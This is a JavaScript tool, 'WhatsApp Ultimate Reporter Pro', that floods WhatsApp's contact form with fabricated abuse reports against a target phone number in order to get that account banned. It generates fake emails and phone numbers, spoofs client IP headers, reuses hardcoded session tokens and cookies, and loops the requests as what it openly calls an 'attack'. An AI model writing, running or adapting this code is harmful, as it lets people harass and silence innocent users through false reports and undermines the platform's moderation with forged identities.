// WhatsApp Ultimate Reporter Pro - JavaScript Version

// Configuration
const WHATSAPP_API_URL = "https://www.whatsapp.com/contact/noclient/";
const REPORT_URL = "https://faq.whatsapp.com/3379690015658337/?helpref=uf_share";
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36";

// Parameters from WhatsApp HTML/JS
const AJAXPIPE_TOKEN = "AXjVMTl_Wz4hIrAtZA8";
const COMPAT_IFRAME_TOKEN = "AUUBoz_O3X_0Wosk3O9XO8rS_NY";
const BRSID = "7525697063073108760";
const FB_LSD = "AVpbkNjZYpw";
const HSRP_REV = "1024646339";

// Utility functions
function generateRandomEmail() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 10; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result + '@gmail.com';
}

function generateRandomPhone(country) {
    const prefixes = {
        'ID': '+62',
        'EG': '+20',
        'US': '+1',
        'KR': '+82',
        'CN': '+86',
        'IN': '+91'
    };
    const prefix = prefixes[country] || '+0';
    let number = '';
    const length = country === 'US' ? 10 : 9;
    for (let i = 0; i < length; i++) {
        number += Math.floor(Math.random() * 10);
    }
    return prefix + number;
}

function urlEncode(str) {
    return encodeURIComponent(str).replace(/%20/g, '+');
}

async function sendApiRequest(postData, randomIp) {
    const headers = {
        'Host': 'www.whatsapp.com',
        'Cookie': 'wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Chromium";v="131", "Not A Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'X-Asbd-Id': '129477',
        'X-Fb-Lsd': FB_LSD,
        'User-Agent': USER_AGENT,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.whatsapp.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.whatsapp.com/contact/noclient?',
        'X-Forwarded-For': randomIp,
        'Client-IP': randomIp
    };

    // Add WhatsApp specific parameters
    const __hs = "20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0";
    const __s = "ugvlz3%3A6skj2s%3A4yux6k";
    const __hsi = Math.floor(Math.random() * 999999999999999999) + 1000000000000000000;
    const __req = (Math.random() * 9.9 + 0.1).toFixed(6);
    const __a = Math.floor(Math.random() * 1000000000) + 1;
    const __rev = HSRP_REV;
    const __dyn = "7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu";
    const jazoest = "20000" + (Math.floor(Math.random() * 90000) + 10000);

    const fullPostData = `${postData}&__hs=${__hs}&dpr=1&__ccg=UNKNOWN&__rev=${__rev}&__s=${__s}&__hsi=${__hsi}&__dyn=${__dyn}&__csr=&lsd=${FB_LSD}&jazoest=${jazoest}`;

    try {
        const response = await fetch(WHATSAPP_API_URL, {
            method: 'POST',
            headers: headers,
            body: fullPostData
        });
        return response.status;
    } catch (error) {
        console.error('Request failed:', error);
        return 0;
    }
}

function sendReportUrl(phoneNumber) {
    const reportUrl = `${REPORT_URL}&phone=${encodeURIComponent(phoneNumber)}`;
    console.log(`Sending report URL: ${reportUrl}`);
    // In a browser environment, you could open the URL in a new tab
    // window.open(reportUrl, '_blank');
}

async function performAttack(numRequests, delay, targetNumber, action) {
    // In a real implementation, you would load these from files
    const messages = [
        {subject: "Report", message: "This account is violating terms of service [###]"},
        {subject: "Ban Request", message: "Please ban this abusive account [###]"}
    ];
    
    const countries = ["ID", "ID", "ID", "EG", "US", "KR", "CN", "IN"];
    const platforms = ["ANDROID", "IPHONE", "WHATS_APP_WEB_DESKTOP", "KAIOS", "OTHER"];
    
    // In a real implementation, you would load these from files
    const randomIps = ["192.168.1.1", "10.0.0.1", "172.16.0.1"];
    const randomPhones = ["1234567890", "9876543210", "5554443333"];
    
    for (let i = 1; i <= numRequests; i++) {
        const randomIp = randomIps[Math.floor(Math.random() * randomIps.length)];
        const randomPhone = randomPhones[Math.floor(Math.random() * randomPhones.length)];
        const randomMessage = messages[Math.floor(Math.random() * messages.length)];
        const processedMessage = randomMessage.message.replace("[###]", targetNumber);
        const country = countries[Math.floor(Math.random() * countries.length)];
        const platform = platforms[Math.floor(Math.random() * platforms.length)];
        const email = generateRandomEmail();
        const phoneNumber = generateRandomPhone(country);
        
        const postData = `country_selector=${country}&email=${urlEncode(email)}&email_confirm=${urlEncode(email)}` +
                         `&phone_number=${urlEncode(phoneNumber)}&platform=${platform}` +
                         `&your_message=${urlEncode(randomMessage.subject + "%A0" + processedMessage)}` +
                         `&step=articles&__user=0&__a=${Math.floor(Math.random() * 1000000000) + 1}` +
                         `&__req=${(Math.random() * 9.9 + 0.1).toFixed(6)}`;
        
        const status = await sendApiRequest(postData, randomIp);
        
        if (status === 200) {
            console.log(`Success: Request ${i} - Target: ${targetNumber} - From: ${randomIp}`);
        } else {
            console.log(`Failed: Request ${i} - Status: ${status}`);
        }
        
        if (i % 5 === 0) {
            sendReportUrl(targetNumber);
        }
        
        await new Promise(resolve => setTimeout(resolve, delay * 1000));
    }
}

// Main function
async function main() {
    console.log(`
    _    _ _   _ _   _ _____ ___  ______   __ _____ _____ _____  
   | |  | | | | | \\ | |_   _/ _ \\|  _ \\ \\ / /|_   _|  ___|  ___| 
   | |  | | | | |  \\| | | || | | | |_) \\ V /   | | | |__ | |__   
   | |/\\| | | | | |\\  | | || |_| |  _ < \\ /    | | |  __||  __|  
   \\  /\\  / |_| | | \\ |_| |_\\___/|_| \\_\\| |    |_| | |___| |___  
    \\/  \\/ \\___/|_|  \\_\\___/            |_|        |_|_____|_____| 
   
   WhatsApp Ultimate Reporter Pro - JavaScript Version
   =================================================
   Created by >>LORDHOZOO<< 
   `);

    // Get user input (in a real app, you'd use DOM elements)
    const targetNumber = "+628123456789"; // Example default
    const action = "ban";
    const numRequests = 10;
    const delay = 5;

    console.log(`Starting attack on ${targetNumber}`);
    console.log(`Action: ${action}, Requests: ${numRequests}, Delay: ${delay}s`);
    
    await performAttack(numRequests, delay, targetNumber, action);
    
    console.log("Attack completed");
}

// Run the program
main().catch(console.error);
